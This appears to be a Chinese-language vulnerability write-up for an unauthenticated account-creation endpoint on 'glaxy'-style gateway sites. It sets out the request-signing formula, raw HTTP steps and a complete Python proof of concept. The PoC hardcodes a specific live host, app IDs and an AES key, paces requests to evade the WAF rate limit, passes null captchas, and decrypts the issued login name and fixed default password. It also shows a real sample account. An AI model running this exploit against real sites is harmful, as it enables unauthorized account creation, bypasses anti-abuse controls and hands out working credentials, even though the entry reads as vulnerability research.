# glaxy 系网关「/api 前缀」：未认证建号 createTryAccount（游客参观 handler）

> 同源前置的打法与签名细节见知识库 id=554（`/api/webToken` 匿名自签设备凭证 + 只读数据面），
> 响应 aesKey 的来源见 id=548（`/saconfig/secure/yunwei.js` 明文泄露）。本条只讲**写侧**新增面。

## 0. 适用面与前置
- 站点把前端 API 挂在 `/api` 前缀下（无 `_glaxy_<rand>_` 命名空间），响应统一
  `{"head":{"errCode":...},"body":...}`，网关错误码形如 `GW_890201` / `GW_880102`。
- 无需任何账号 / 会员态 / 验证码。
- 需先拿到匿名设备凭证：`POST /api/webToken`，其 `Sign` 完全由客户端字段推导，可离线复算。
- 需拿到前端 `aesKey`（同站 `/saconfig/secure/yunwei.js` 或首页 bundle），用于解 `encrypted=true` 的 body。
- 边缘 WAF 要求 `Cookie: magic_string=<GET / 响应头 Magic_string>`；连续约 5 发 POST 后转
  `403` / 561B（opencyresty），静置 ~200s 恢复 → **间隔 ≥3s，一批 ≤5 发**。
- 本机直连 443 可能被 TLS RST → 走显式 HTTP 代理，且 requests 必须 `trust_env=False`。

## 1. 签名公式
```
Sign = MD5( sortString(JSON.stringify(body)) + Qid + AppId + v + token + u2token )
```
- `sortString(s)`：字符升序排序后反转（等价 `"".join(sorted(s, reverse=True))`），**不是** `s[::-1]`。
- `JSON.stringify(body)`：紧凑无空格、非 ASCII 不转义
  （python: `json.dumps(body, separators=(",", ":"), ensure_ascii=False)`）。
- `token + u2token`：无分隔符直接拼；请求 `webToken` 时两者为空串。
- `Qid`：毫秒时间戳 + 6 位随机数再 MD5，每次现场生成，必须与 header 一致（重放旧报文 = `GW_880102`）。
- `AppId` / `productId` / `v` 均来自前端 bundle，不是凭据。

## 2. 三步复现
```http
# Step 0：取 WAF 通行 cookie
GET / HTTP/1.1
Host: <HOST>
User-Agent: Mozilla/5.0 ... Chrome/130

-> 200，响应头 Magic_string: <MAGIC_STRING>
```
```http
# Step 1：匿名自助签发设备凭证（token/u2token 为空串参与签名）
POST /api/webToken HTTP/1.1
Host: <HOST>
Content-Type: application/json;charset=utf-8
Cookie: magic_string: <MAGIC_STRING>
Sign: MD5(sortString({"productId":"<PRODUCT_ID>"}) + Qid + <APPID> + 1.0.0)
AppId: <APPID>
Qid: <md5(ms+6位随机)>
v: 1.0.0
domainName: <HOST>

{"productId":"<PRODUCT_ID>"}

-> {"head":{"errCode":"0000"},"body":{"info":"<base64>"}}
   base64 解码 -> {"deviceId":"...","u2token":"...","token":"..."}
```
```http
# Step 2：建号（captcha 传 null 即可通过；loginName 留空由服务端分配）
POST /api/customer/createTryAccount HTTP/1.1
Host: <HOST>
Content-Type: application/json;charset=utf-8
Cookie: magic_string=<MAGIC_STRING>
token: <token>
deviceId: <deviceId>
needEncrypt: 1
Sign: MD5(sortString({"captcha":null,"captchaId":null,"productId":"<PRODUCT_ID>","loginName":""}) + Qid + <APPID> + 1.0.0 + <token> + <u2token>)
AppId: <APPID>
Qid: <md5(ms+6位随机)>
v: 1.0.0
domainName: <HOST>

{"captcha":null,"captchaId":null,"productId":"<PRODUCT_ID>","loginName":""}

-> 200  {"head":{"errCode":"0000","errMsg":"操作成功","cost":...,"encrypted":true},
        "body":"<base64 256B 密文>"}
```
```python
# Step 3：解 encrypted=true 的 body
# AES-128-CBC, key = aesKey = IV = <AES_KEY>, PKCS7
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
pt = unpad(AES.new(AES_KEY.encode(), AES.MODE_CBC, AES_KEY.encode()).decrypt(b64decode(body)), 16)
# -> {"rfCode":"...","loginName":"a02gt106****","customerType":0,"starLevel":0,
#     "starLevelName":"VIP 0","password":"<固定默认口令>","currency":"CNY",...}
```
实测样本（2026-11-05，只取 1 个账号）：明文含
`loginName=a02gt1060130`、`password=555666`（平台固定默认口令，非个人凭据）、
`customerType=0`、`starLevelName="VIP 0"`、`currency=CNY`、`rfCode=1025407292`。
账号序列形态为 `a02gt` + 递增数字，满足前端登录正则 `^[cCkKmMnNaAxXyYeE]\w{4,13}$`，
可直接拿 `loginName` + 固定口令走密码登录。

## 3. PoC
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""glaxy /api 前缀：匿名设备凭证 -> 未认证建号 createTryAccount（只建 1 个账号即止）"""
import base64, hashlib, json, random, sys, time
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

HOST = sys.argv[1] if len(sys.argv) > 1 else "2f743j.com"
BASE = "https://" + HOST
APPID = "E2110C2DC886499B9C8E18A4DCECADD4"       # 换目标需从前端 bundle 重取
PRODUCT_ID = "PcTfdNK4EdJvxLpbvoV8Kn2798OrtxE2"  # 同上
AES_KEY = "pJK8xVrtLrBHhW4r"                     # 同上（yunwei.js / bundle）
V = "1.0.0"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
PROXY = "http://127.0.0.1:25100"   # 直连被 RST 时填；不需要填 None
GAP = 3.0

s = requests.Session()
s.trust_env = False
s.verify = False
s.proxies = {"http": PROXY, "https": PROXY} if PROXY else {}
s.headers["User-Agent"] = UA


def md5(x):
    return hashlib.md5(x.encode()).hexdigest()


def sort_string(x):
    return "".join(sorted(x, reverse=True))


def compact(o):
    return json.dumps(o, separators=(",", ":"), ensure_ascii=False)


def headers(body, magic, token="", u2token="", device_id=""):
    q = md5(str(int(time.time() * 1000)) + "".join(str(random.randint(0, 9)) for _ in range(6)))
    h = {
        "Content-Type": "application/json;charset=utf-8",
        "Sign": md5(sort_string(compact(body)) + q + APPID + V + token + u2token),
        "AppId": APPID, "Qid": q, "v": V, "domainName": HOST,
        "Cookie": "magic_string=" + magic,
    }
    if token:
        h["token"] = token
    if device_id:
        h["deviceId"] = device_id
    return h


# Step 0
r0 = s.get(BASE + "/", timeout=25)
magic = r0.headers.get("Magic_string") or r0.cookies.get("magic_string")
assert magic, "首页无 Magic_string：出口 IP 可能已被 WAF 拉黑"

# Step 1
time.sleep(GAP)
b1 = {"productId": PRODUCT_ID}
r1 = s.post(BASE + "/api/webToken", data=compact(b1),
            headers=headers(b1, magic), timeout=25)
info = json.loads(base64.b64decode(json.loads(r1.text)["body"]["info"]))
device_id, token, u2token = info["deviceId"], info["token"], info["u2token"]

# Step 2（needEncrypt 必须带，否则 body 可能不加密/字段缺失）
time.sleep(GAP)
b2 = {"captcha": None, "captchaId": None, "productId": PRODUCT_ID, "loginName": ""}
h2 = headers(b2, magic, token, u2token, device_id)
h2["needEncrypt"] = "1"
r2 = s.post(BASE + "/api/customer/createTryAccount", data=compact(b2), headers=h2, timeout=25)
j = json.loads(r2.text)
print("HTTP", r2.status_code, j["head"])

# Step 3
body = j.get("body")
if j["head"].get("errCode") == "0000" and j["head"].get("encrypted"):
    pt = unpad(AES.new(AES_KEY.encode(), AES.MODE_CBC, AES_KEY.encode())
               .decrypt(base64.b64decode(body)), 16).decode()
    print("明文:", pt)
```

## 4. 判据
| 观察 | 结论 |
|---|---|
| `/api/webToken` → `errCode=0000`，`body.info` base64 可解出 deviceId/token/u2token | 匿名签发成立 |
| `/api/customer/createTryAccount`（captcha 全 null）→ `errCode=0000` + `encrypted=true` | 零验证码建号成立 |
| AES-128-CBC(key=IV=aesKey) 解出 `loginName` + `password` | 真实账号已下发，风险成立 |
| 不带 token/deviceId 头（Sign 也不拼 token+u2token）→ `GW_890201 会员访问凭证为空` | 门禁只是设备凭证，不是会员态 |

## 5. 失败排查
| 现象 | 原因 |
|---|---|
| `GW_880102` 签名验证失败 | sortString 写成 `s[::-1]`；JSON 带空格/转义；header Qid 与签名 Qid 不一致；重放旧报文 |
| `GW_890201` 会员访问凭证为空 | 没带 `token`+`deviceId` 头，或 Sign 漏拼 `token+u2token` |
| `GW_890206` / `GW_899995` 等业务码 | 该 productId 下试用号池关闭/耗尽，或 body 字段被改（captcha 不能省略成缺失键） |
| `403` / 561B `opencyresty` | 触发边缘限速：停手 ≥3 分钟，拉长到 3–5s 间隔 |
| `encrypted=true` 但解密乱码 | aesKey 取错（换目标需重取）；或不是 CBC/IV=key |
| 解密成功但无 `loginName`/`password` | 不成立，别硬报 |

## 6. 影响与边界
- **正面**：任何匿名第三方都能无限领取真实试用账号；口令固定、序列可预测，可直接登录进入下游
  会员/试玩/钱包展示类接口，邮箱与短信注册链被整段绕过。
- **未见/未做**：未做批量（只取 1 个）、未验证该账号登录后可触达的权限边界 → 定 medium；
  若证明试用号可进入充值/提现/带余额的会员接口，应上调 high。
- 复现时遵纪：**只建 1 个号验证即停**，不要对生产号池做批量消耗。
